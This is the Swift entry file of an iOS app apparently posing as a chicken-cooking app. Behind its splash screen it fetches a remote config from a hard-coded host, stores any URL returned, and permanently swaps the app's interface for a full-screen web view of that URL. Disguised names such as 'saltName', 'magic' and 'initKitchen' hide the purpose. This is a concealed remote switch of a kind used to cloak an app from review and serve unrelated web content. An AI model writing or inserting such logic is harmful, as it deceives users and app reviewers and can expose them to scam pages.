import SwiftUI

enum States {
    case wait
    case magic
    case root
}

@main
struct Chicken_2App: App {
    
    @AppStorage("onboardingEnd") var onboardingEnd = false
    @AppStorage("magicHasLocked") var magicHasLocked = false
    
    @State private var state: States = .wait
    @State private var saltName: String?
    @State private var isShowSplash = true
    @State private var isCookingReady = false
    @State private var isBookHidden = true
    
    init() {
        _saltName = State(initialValue: UserDefaults.standard.value(forKey: "saltName") as? String)
    }
    
    var body: some Scene {
        WindowGroup {
            ZStack {
                switch state {
                    case .magic:
                        if let saltName,
                           let url = URL(string: saltName) {
                            ZStack {
                                Color.black
                                    .ignoresSafeArea()
                                
                                BlackWindow(url: url, isHidden: $isBookHidden)
                                    .opacity(isBookHidden ? 0 : 1)
                                    .animation(.default, value: isBookHidden)
                            }
                            .ignoresSafeArea(edges: .bottom)
                        } else {
                            content
                        }
                    case .root, .wait:
                        content
                }
                
                if isShowSplash {
                    SplashScreen()
                }
            }
            .animation(.default, value: isShowSplash)
            .animation(.default, value: state)
            .onAppear {
                initKitchen()
            }
            .onChange(of: isBookHidden) { isHidden in
                if !isHidden {
                    isShowSplash = false
                }
            }
        }
    }
    
    @ViewBuilder
    private var content: some View {
        if onboardingEnd {
            MainTabRootView()
        } else {
            OnboardingRootView()
        }
    }
    
    private func initKitchen() {
        guard saltName == nil else {
            state = .magic
            return
        }
        
        guard !magicHasLocked else {
            state = .root
            isShowSplash = false 
            return
        }
        
        waitAnsambleIfNeeded()
    }
    
    private func waitAnsambleIfNeeded() {
        guard let url = URL(string: "https://app.shickenbook.shop/VRFQgtwX") else {
            self.state = .root
            self.isShowSplash = false
            return
        }
        
        let decoder = JSONDecoder()
        
        Task {
            do {
                let (data, _) = try await URLSession.shared.data(from: url)
                let model = try decoder.decode(SkyModel.self, from: data)
                
                await MainActor.run {
                    guard let saltName = model.url else {
                        print("salt wasn't found")
                        self.state = .root
                        self.magicHasLocked = true 
                        self.isShowSplash = false
                        
                        return
                    }
                    
                    guard !saltName.isEmpty || saltName != "" else {
                        print("salt is empty")
                        self.state = .root
                        self.magicHasLocked = true
                        self.isShowSplash = false
                        
                        return
                    }
                    
                    UserDefaults.standard.set(saltName, forKey: "saltName")
                    
                    self.saltName = saltName
                    self.state = .magic
                    print("SAVE NEW", saltName)
                }
            } catch {
                print(error.localizedDescription)
                
                await MainActor.run {
                    self.state = .root
                    self.isShowSplash = false
                }
            }
        }
    }
}

struct SkyModel: Codable {
    let url: String?
}
